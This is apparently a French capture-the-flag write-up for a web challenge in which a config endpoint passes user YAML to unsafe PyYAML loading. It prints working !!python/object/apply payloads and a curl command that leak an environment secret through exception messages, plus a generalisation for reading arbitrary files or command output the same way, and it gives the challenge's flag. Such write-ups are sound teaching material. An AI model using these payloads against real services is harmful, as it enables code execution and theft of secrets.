# boazak--vogan (web / YAML deser RCE, id 470)

**Flag (finale) :** `NCTF{3477daa63b62b83dc574cca9}`

## Contexte
ConfigHub : `POST /apply` avec `config=<YAML>` chargé en `yaml.load` non sûr (RCE).
Indice : « désérialisation YAML un peu trop **magique** ».

## Difficulté : pas de reflet
La réponse de `/apply` est générique. MAIS :
- Un résultat non-dict → 400 « La configuration doit etre un objet YAML ».
- **Une exception levée pendant la construction est RENVOYÉE** : « YAML invalide : <msg> ».
  → **oracle d'erreur**.
- PyYAML résout `module.attr` : `os.getenv` OK, mais `os.environ.__getitem__` échoue
  (« os n'est pas un package »). `os.system`/`subprocess` s'exécutent mais leur
  résultat non-dict est rejeté sans fuite.

## Exploitation (lecture du flag par l'erreur)
Le flag est dans l'env `FLAG`. On `open()` une valeur = flag → FileNotFoundError fuit le flag :
```
config=!!python/object/apply:builtins.open [!!python/object/apply:os.getenv ["FLAG"]]
```
→ `YAML invalide : [Errno 2] No such file or directory: 'NCTF{...}'`

```bash
curl -s $B/apply --data-urlencode \
 'config=!!python/object/apply:builtins.open [!!python/object/apply:os.getenv ["FLAG"]]'
```

## Généralisation
Pour lire un **fichier** par l'erreur : `int(open(path).read())` → ValueError avec le contenu
(ou `subprocess.check_output([...])` emballé dans `int()`).
